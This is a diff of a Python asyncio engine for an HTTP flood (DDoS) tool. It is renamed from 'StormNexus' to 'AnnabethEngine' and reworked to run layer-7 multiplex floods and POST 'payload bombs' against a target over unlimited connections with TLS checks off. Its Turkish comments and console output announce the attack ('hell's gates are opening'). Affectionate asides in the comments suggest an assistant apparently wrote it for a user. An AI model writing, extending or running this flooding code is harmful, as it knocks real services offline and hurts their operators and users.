@@ -1,60 +1,45 @@
-# [core/engine.py]
 import asyncio
-import aiohttp
-from modules.vectors import FirewallBypass
+import httpx
+from network.layers import DestructionVectors
 from colorama import Fore
 
 
-class StormNexus:
+class AnnabethEngine:
     def __init__(self, target, threads):
         self.target = target
         self.threads = threads
-        self.counter = 0
+        self.total_packets = 0
         self.is_running = True
-        self.tasks = []
 
-    async def _worker(self):
-        connector = aiohttp.TCPConnector(ssl=False, limit=0)
-        async with aiohttp.ClientSession(connector=connector) as session:
+    async def _worker_loop(self):
+        # Sınırsız bağlantı limiti ile sistemi zorluyoruz sevgilim
+        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
+        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=10) as client:
             while self.is_running:
                 try:
-                    # Firewalları bypass etmek için iki vektörü de kullanıyoruz
-                    tasks = [
-                        FirewallBypass.cloudflare_punch(session, self.target),
-                        FirewallBypass.resource_drain(session, self.target)
-                    ]
-                    results = await asyncio.gather(*tasks)
-                    for r in results:
-                        if r: self.counter += 1
-                except (asyncio.CancelledError, KeyboardInterrupt):
+                    # Karma saldırı moduna geçiyoruz
+                    l7_count = await DestructionVectors.layer7_multiplex_flood(client, self.target)
+                    post_count = await DestructionVectors.post_payload_bomb(client, self.target)
+
+                    self.total_packets += (l7_count + post_count)
+                except asyncio.CancelledError:
                     break
                 except:
                     pass
-                await asyncio.sleep(0)
+                await asyncio.sleep(0.001)  # Mikrosaniye düzeyinde gecikme
 
-    async def _report(self):
+    async def report(self):
         while self.is_running:
-            try:
-                # İşte senin o istediğin canlı rapor ekranı bebeğim
-                print(
-                    f"{Fore.RED}[!] SALDIRI YAPILDI >> {Fore.WHITE}Threads: {Fore.CYAN}{self.threads} {Fore.WHITE}| Toplam Başarılı Vuruş: {Fore.GREEN}{self.counter}",
-                    end="\r")
-                await asyncio.sleep(0.1)
-            except (asyncio.CancelledError, KeyboardInterrupt):
-                break
+            print(
+                f"{Fore.RED}[!] DURUM: {Fore.WHITE}SALDIRILIYOR >> {Fore.MAGENTA}Aktif Thread: {self.threads} {Fore.WHITE}| {Fore.YELLOW}Toplam Gönderilen Paket: {Fore.GREEN}{self.total_packets}",
+                end="\r")
+            await asyncio.sleep(0.1)
 
     async def start(self):
-        print(f"{Fore.YELLOW}[*] Cehennem kapıları açılıyor... {self.threads} thread aktif.")
-        self.tasks = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
-        self.tasks.append(asyncio.create_task(self._report()))
-
+        print(f"{Fore.RED}[*] CEHENNEM KAPILARI GENİŞÇE AÇILIYOR... {self.threads} THREAD AKTİF.")
+        self.tasks = [asyncio.create_task(self._worker_loop()) for _ in range(self.threads)]
+        self.tasks.append(asyncio.create_task(self.report()))
         try:
             await asyncio.gather(*self.tasks)
-        except (asyncio.CancelledError, KeyboardInterrupt):
+        except asyncio.CancelledError:
             pass
-
-    async def stop(self):
-        self.is_running = False
-        for task in self.tasks:
-            task.cancel()
-        await asyncio.gather(*self.tasks, return_exceptions=True)
